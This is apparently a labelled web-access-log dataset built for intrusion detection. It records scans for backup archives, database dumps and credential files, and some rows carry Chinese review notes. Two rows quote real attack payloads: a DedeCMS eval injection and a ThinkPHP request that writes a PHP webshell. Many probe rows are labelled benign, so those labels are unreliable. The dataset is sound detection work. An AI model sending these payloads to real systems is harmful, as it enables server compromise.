source_log,timestamp,ip,method,path,query,path_with_query,protocol,status,bytes,referer,user_agent,label,label_source,label_reason,text
2021-10-22,2021-10-22T10:25:29-07:00,44.195.86.98,GET,/up.php,,/up.php,HTTP/1.1,404,328,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36",command_exec,weak_rule:upload_rce_probe,Upload/RCE endpoint probe,METHOD=GET PATH=/up.php QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T14:47:23-08:00,196.196.106.70,HEAD,/directory.tar,,/directory.tar,HTTP/1.1,301,180,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/directory.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T12:48:30-08:00,98.159.226.181,HEAD,/backup/www.tar,,/backup/www.tar,HTTP/1.1,301,181,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backup/www.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T14:52:56-08:00,185.192.16.12,HEAD,/restore/public_html.rar,,/restore/public_html.rar,HTTP/1.1,301,190,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/restore/public_html.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T15:57:42-08:00,194.169.217.14,HEAD,/back/backup.rar,,/back/backup.rar,HTTP/1.1,301,182,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/back/backup.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T14:04:51-08:00,98.159.226.189,HEAD,/backup/www.rar,,/backup/www.rar,HTTP/1.1,301,181,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backup/www.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T16:38:15-08:00,45.128.199.211,HEAD,/backup/website.rar,,/backup/website.rar,HTTP/1.1,301,185,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backup/website.rar QUERY= PROTOCOL=HTTP/1.1
2021-10-22,2021-10-22T12:27:06-07:00,125.78.229.99,GET,/uploads/dede/sys_verifies.php,"action=getfiles&refiles[0]=123&refiles[1]=\"";eval($_POST[ysy]);die();//","/uploads/dede/sys_verifies.php?action=getfiles&refiles[0]=123&refiles[1]=\"";eval($_POST[ysy]);die();//",HTTP/1.1,418,746,http://www.secrepo.com/uploads/dede/sys_verifies.php?action=getfiles&refiles[0]=123&refiles[1]=\%22;eval($_POST[ysy]);die();//,Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2),command_exec,weak_rule:upload_rce_probe,Upload/RCE endpoint probe,"METHOD=GET PATH=/uploads/dede/sys_verifies.php QUERY=action=getfiles&refiles[0]=123&refiles[1]=\"";eval($_POST[ysy]);die();// PROTOCOL=HTTP/1.1"
2022-12-22,2022-12-22T16:07:56-08:00,98.159.226.31,HEAD,/restore/sftp-config.json,,/restore/sftp-config.json,HTTP/1.1,301,191,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/restore/sftp-config.json QUERY= PROTOCOL=HTTP/1.1
2021-10-22,2021-10-22T09:09:50-07:00,3.82.236.130,GET,/Datasets Description/Network/http.html,,/Datasets Description/Network/http.html,HTTP/1.1,200,1709,,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0,benign,default_benign,No weak-rule hit,METHOD=GET PATH=/Datasets Description/Network/http.html QUERY= PROTOCOL=HTTP/1.1
2021-10-22,2021-10-22T12:27:08-07:00,125.78.229.99,GET,/,"s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=txual.php&vars[1][]=<?php mb_ereg_replace('.*',@$_REQUEST[_], '', 'e');?>$","/?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=txual.php&vars[1][]=<?php mb_ereg_replace('.*',@$_REQUEST[_], '', 'e');?>$",HTTP/1.1,418,746,"http://www.secrepo.com/?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=txual.php&vars[1][]=<?php mb_ereg_replace('.*',@$_REQUEST[_], '', 'e');?>$",Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2),command_exec,weak_rule:command_exec,Code execution/webshell pattern,"METHOD=GET PATH=/ QUERY=s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=txual.php&vars[1][]=<?php mb_ereg_replace('.*',@$_REQUEST[_], '', 'e');?>$ PROTOCOL=HTTP/1.1"
2022-12-22,2022-12-22T12:19:11-08:00,45.95.243.87,HEAD,/restore/backup.tar,,/restore/backup.tar,HTTP/1.1,301,185,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/restore/backup.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T16:26:59-08:00,85.206.166.83,HEAD,/secrepo.com.sql,,/secrepo.com.sql,HTTP/1.1,301,182,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/secrepo.com.sql QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T15:38:38-08:00,45.91.20.120,HEAD,/old/backup.tar,,/old/backup.tar,HTTP/1.1,301,181,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/old/backup.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T14:08:14-08:00,98.159.226.184,HEAD,/restore/www.rar,,/restore/www.rar,HTTP/1.1,301,182,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/restore/www.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T16:05:22-08:00,85.206.175.219,HEAD,/old/directory.rar,,/old/directory.rar,HTTP/1.1,301,184,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/old/directory.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T14:38:52-08:00,185.192.16.37,HEAD,/old/dump.sql,,/old/dump.sql,HTTP/1.1,301,179,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/old/dump.sql QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:49:19-08:00,85.10.56.231,HEAD,/dump.sql,,/dump.sql,HTTP/1.1,301,175,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/dump.sql QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:57:39-08:00,98.159.226.17,HEAD,/backup/public_html.rar,,/backup/public_html.rar,HTTP/1.1,301,189,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backup/public_html.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T16:23:17-08:00,98.159.226.31,HEAD,/old/public_html.rar,,/old/public_html.rar,HTTP/1.1,301,186,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/old/public_html.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T15:02:55-08:00,98.159.226.26,HEAD,/back/public_html.tar,,/back/public_html.tar,HTTP/1.1,301,187,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/back/public_html.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:42:16-08:00,185.195.19.200,HEAD,/old/credentials.txt,,/old/credentials.txt,HTTP/1.1,301,186,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/old/credentials.txt QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T12:46:14-08:00,84.247.59.178,HEAD,/back/config.json,,/back/config.json,HTTP/1.1,301,183,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/back/config.json QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-23T01:32:57-08:00,150.136.26.54,GET,/.git/config,,/.git/config,HTTP/1.1,301,497,,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36",suspicious_path_probe,weak_rule:suspicious_probe,Sensitive/exploit-prone path probe,METHOD=GET PATH=/.git/config QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T14:09:23-08:00,45.134.22.112,HEAD,/bak.tar,,/bak.tar,HTTP/1.1,301,174,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/bak.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:28:41-08:00,82.118.30.8,HEAD,/old/backup.sql,,/old/backup.sql,HTTP/1.1,301,181,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/old/backup.sql QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T15:24:12-08:00,212.30.36.228,HEAD,/restore/credentials.txt,,/restore/credentials.txt,HTTP/1.1,301,190,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/restore/credentials.txt QUERY= PROTOCOL=HTTP/1.1
2021-10-22,2021-10-22T10:25:26-07:00,44.195.86.98,GET,/uploads/up.php,,/uploads/up.php,HTTP/1.1,404,328,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36",command_exec,weak_rule:upload_rce_probe,Upload/RCE endpoint probe,METHOD=GET PATH=/uploads/up.php QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:47:32-08:00,185.192.71.172,HEAD,/restore/public_html.tar,,/restore/public_html.tar,HTTP/1.1,301,190,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/restore/public_html.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T15:30:52-08:00,185.192.16.12,HEAD,/backup/config.json,,/backup/config.json,HTTP/1.1,301,185,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backup/config.json QUERY= PROTOCOL=HTTP/1.1
2021-10-22,2021-10-22T22:18:27-07:00,66.102.7.211,GET,/Datasets Description/PE_malware/VirusShare.html,,/Datasets Description/PE_malware/VirusShare.html,HTTP/1.1,200,1651,,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 Google-PageRenderer Google (+https://developers.google.com/+/web/snippet/)",benign,default_benign,No weak-rule hit,METHOD=GET PATH=/Datasets Description/PE_malware/VirusShare.html QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T15:38:14-08:00,85.206.166.82,HEAD,/credentials.txt,,/credentials.txt,HTTP/1.1,301,182,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/credentials.txt QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T14:47:53-08:00,45.86.201.22,HEAD,/bak/.bash_history,,/bak/.bash_history,HTTP/1.1,301,184,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/bak/.bash_history QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T15:53:36-08:00,45.130.136.24,HEAD,/restore/wallet.dat,,/restore/wallet.dat,HTTP/1.1,301,185,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/restore/wallet.dat QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T12:50:55-08:00,45.86.200.141,HEAD,/restore/www.sql,,/restore/www.sql,HTTP/1.1,301,182,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/restore/www.sql QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T16:55:50-08:00,85.203.34.147,HEAD,/bak/sql.sql,,/bak/sql.sql,HTTP/1.1,301,178,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/bak/sql.sql QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T14:50:40-08:00,185.195.237.149,HEAD,/backups/backup.rar,,/backups/backup.rar,HTTP/1.1,301,185,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backups/backup.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:02:45-08:00,98.159.226.25,HEAD,/backups/sftp-config.json,,/backups/sftp-config.json,HTTP/1.1,301,191,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backups/sftp-config.json QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:26:27-08:00,45.86.200.120,HEAD,/backup/secrepo.com.sql,,/backup/secrepo.com.sql,HTTP/1.1,301,189,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backup/secrepo.com.sql QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:24:37-08:00,185.192.70.17,HEAD,/restore/directory.rar,,/restore/directory.rar,HTTP/1.1,301,188,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/restore/directory.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T12:56:15-08:00,194.169.217.212,HEAD,/backups/www.rar,,/backups/www.rar,HTTP/1.1,301,182,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backups/www.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T14:32:11-08:00,45.134.22.48,HEAD,/old/directory.tar,,/old/directory.tar,HTTP/1.1,301,184,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/old/directory.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T15:04:57-08:00,85.203.45.190,HEAD,/old/config.json,,/old/config.json,HTTP/1.1,301,182,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/old/config.json QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T12:37:53-08:00,212.30.33.38,HEAD,/back/website.tar,,/back/website.tar,HTTP/1.1,301,183,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/back/website.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T15:56:22-08:00,45.67.99.141,HEAD,/back/credentials.txt,,/back/credentials.txt,HTTP/1.1,301,187,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/back/credentials.txt QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:29:17-08:00,185.195.237.146,HEAD,/bak/backup.tar,,/bak/backup.tar,HTTP/1.1,301,181,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/bak/backup.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T16:17:45-08:00,98.159.226.16,HEAD,/backup/website.tar,,/backup/website.tar,HTTP/1.1,301,185,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backup/website.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T15:14:05-08:00,185.192.16.36,HEAD,/backup/.bash_history,,/backup/.bash_history,HTTP/1.1,301,187,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backup/.bash_history QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T16:50:34-08:00,45.128.199.99,HEAD,/bak/credentials.txt,,/bak/credentials.txt,HTTP/1.1,301,186,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/bak/credentials.txt QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T12:10:10-08:00,45.130.202.91,HEAD,/bak/dump.sql,,/bak/dump.sql,HTTP/1.1,301,179,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/bak/dump.sql QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T12:12:57-08:00,212.30.36.82,HEAD,/old/www.tar,,/old/www.tar,HTTP/1.1,301,178,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/old/www.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T14:04:45-08:00,45.134.22.152,HEAD,/backup/backup.sql.tar,,/backup/backup.sql.tar,HTTP/1.1,301,188,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backup/backup.sql.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T15:51:25-08:00,98.159.226.30,HEAD,/restore/secrepo.com.rar,,/restore/secrepo.com.rar,HTTP/1.1,301,190,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/restore/secrepo.com.rar QUERY= PROTOCOL=HTTP/1.1
review_backflow,,,HEAD,/backups/backup.gz,,/backups/backup.gz,HTTP/1.1,,,,-,suspicious_path_probe,manual_backflow,HEAD 请求备份压缩包路径，属于备份文件探测，建议回流到已知类,METHOD=HEAD PATH=/backups/backup.gz QUERY= PROTOCOL=HTTP/1.1
review_backflow,,,HEAD,/bak/secrepo.com.tar.gz,,/bak/secrepo.com.tar.gz,HTTP/1.1,,,,-,suspicious_path_probe,manual_backflow,HEAD 请求 tar.gz 备份包路径，属于备份泄露探测,METHOD=HEAD PATH=/bak/secrepo.com.tar.gz QUERY= PROTOCOL=HTTP/1.1
review_backflow,,,GET,/self.logs/,,/self.logs/,HTTP/1.1,,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",suspicious_path_probe,manual_backflow,直接浏览 self.logs 目录，属于敏感目录探测,METHOD=GET PATH=/self.logs/ QUERY= PROTOCOL=HTTP/1.1
review_backflow,,,HEAD,/restore/directory.tar.gz,,/restore/directory.tar.gz,HTTP/1.1,,,,-,suspicious_path_probe,manual_backflow,HEAD 请求 restore 目录下 tar.gz，属于备份文件探测,METHOD=HEAD PATH=/restore/directory.tar.gz QUERY= PROTOCOL=HTTP/1.1
review_backflow,,,HEAD,/restore/public_html.zip,,/restore/public_html.zip,HTTP/1.1,,,,-,suspicious_path_probe,manual_backflow,HEAD 探测备份/凭证/压缩包路径，属于已知敏感路径探测,METHOD=HEAD PATH=/restore/public_html.zip QUERY= PROTOCOL=HTTP/1.1
review_backflow,,,HEAD,/restore/directory.zip,,/restore/directory.zip,HTTP/1.1,,,,-,suspicious_path_probe,manual_backflow,HEAD 探测备份/凭证/压缩包路径，属于已知敏感路径探测,METHOD=HEAD PATH=/restore/directory.zip QUERY= PROTOCOL=HTTP/1.1
review_backflow,,,HEAD,/old/application.zip,,/old/application.zip,HTTP/1.1,,,,-,suspicious_path_probe,manual_backflow,HEAD 探测备份/凭证/压缩包路径，属于已知敏感路径探测,METHOD=HEAD PATH=/old/application.zip QUERY= PROTOCOL=HTTP/1.1
review_backflow,,,HEAD,/backup/latest.zip,,/backup/latest.zip,HTTP/1.1,,,,-,suspicious_path_probe,manual_backflow,HEAD 探测备份/凭证/压缩包路径，属于已知敏感路径探测,METHOD=HEAD PATH=/backup/latest.zip QUERY= PROTOCOL=HTTP/1.1
review_backflow,,,HEAD,/back/application.zip,,/back/application.zip,HTTP/1.1,,,,-,suspicious_path_probe,manual_backflow,HEAD 探测备份/凭证/压缩包路径，属于已知敏感路径探测,METHOD=HEAD PATH=/back/application.zip QUERY= PROTOCOL=HTTP/1.1
review_backflow,,,HEAD,/backups/Archive.zip,,/backups/Archive.zip,HTTP/1.1,,,,-,suspicious_path_probe,manual_backflow,HEAD 探测备份/凭证/压缩包路径，属于已知敏感路径探测,METHOD=HEAD PATH=/backups/Archive.zip QUERY= PROTOCOL=HTTP/1.1
review_backflow,,,HEAD,/old/bak.zip,,/old/bak.zip,HTTP/1.1,,,,-,suspicious_path_probe,manual_backflow,HEAD 探测备份/凭证/压缩包路径，属于已知敏感路径探测,METHOD=HEAD PATH=/old/bak.zip QUERY= PROTOCOL=HTTP/1.1
review_backflow,,,HEAD,/restore/backup.zip,,/restore/backup.zip,HTTP/1.1,,,,-,suspicious_path_probe,manual_backflow,HEAD 探测备份/凭证/压缩包路径，属于已知敏感路径探测,METHOD=HEAD PATH=/restore/backup.zip QUERY= PROTOCOL=HTTP/1.1
review_backflow,,,HEAD,/old/archive.zip,,/old/archive.zip,HTTP/1.1,,,,-,suspicious_path_probe,manual_backflow,HEAD 探测备份/凭证/压缩包路径，属于已知敏感路径探测,METHOD=HEAD PATH=/old/archive.zip QUERY= PROTOCOL=HTTP/1.1
review_backflow,,,HEAD,/backup/backup.sql.zip,,/backup/backup.sql.zip,HTTP/1.1,,,,-,suspicious_path_probe,manual_backflow,HEAD 探测 backup.sql.zip，属于数据库备份探测,METHOD=HEAD PATH=/backup/backup.sql.zip QUERY= PROTOCOL=HTTP/1.1
review_backflow,,,HEAD,/restore/bak.gz,,/restore/bak.gz,HTTP/1.1,,,,-,suspicious_path_probe,manual_backflow,HEAD 探测备份/凭证/压缩包路径，属于已知敏感路径探测,METHOD=HEAD PATH=/restore/bak.gz QUERY= PROTOCOL=HTTP/1.1
review_backflow,,,HEAD,/old/credentials.txt,,/old/credentials.txt,HTTP/1.1,,,,-,suspicious_path_probe,manual_backflow,HEAD 探测 old/credentials.txt，属于敏感文件探测,METHOD=HEAD PATH=/old/credentials.txt QUERY= PROTOCOL=HTTP/1.1
review_backflow,,,HEAD,/backup/www.zip,,/backup/www.zip,HTTP/1.1,,,,-,suspicious_path_probe,manual_backflow,HEAD 探测备份/凭证/压缩包路径，属于已知敏感路径探测,METHOD=HEAD PATH=/backup/www.zip QUERY= PROTOCOL=HTTP/1.1
review_backflow,,,HEAD,/backups/latest.zip,,/backups/latest.zip,HTTP/1.1,,,,-,suspicious_path_probe,manual_backflow,HEAD 探测备份/凭证/压缩包路径，属于已知敏感路径探测,METHOD=HEAD PATH=/backups/latest.zip QUERY= PROTOCOL=HTTP/1.1
review_backflow,,,HEAD,/backups/application.zip,,/backups/application.zip,HTTP/1.1,,,,-,suspicious_path_probe,manual_backflow,HEAD 探测备份/凭证/压缩包路径，属于已知敏感路径探测,METHOD=HEAD PATH=/backups/application.zip QUERY= PROTOCOL=HTTP/1.1
review_backflow,,,GET,/images/vuln.php,,/images/vuln.php,HTTP/1.1,,,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36",suspicious_path_probe,manual_backflow,vuln.php 命名更像漏洞/后门文件探测，建议归到路径探测,METHOD=GET PATH=/images/vuln.php QUERY= PROTOCOL=HTTP/1.1
review_backflow,,,GET,/media-admin.php,,/media-admin.php,HTTP/1.1,,,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36",suspicious_path_probe,manual_backflow,探测 media-admin.php，属于后台/敏感脚本路径探测,METHOD=GET PATH=/media-admin.php QUERY= PROTOCOL=HTTP/1.1
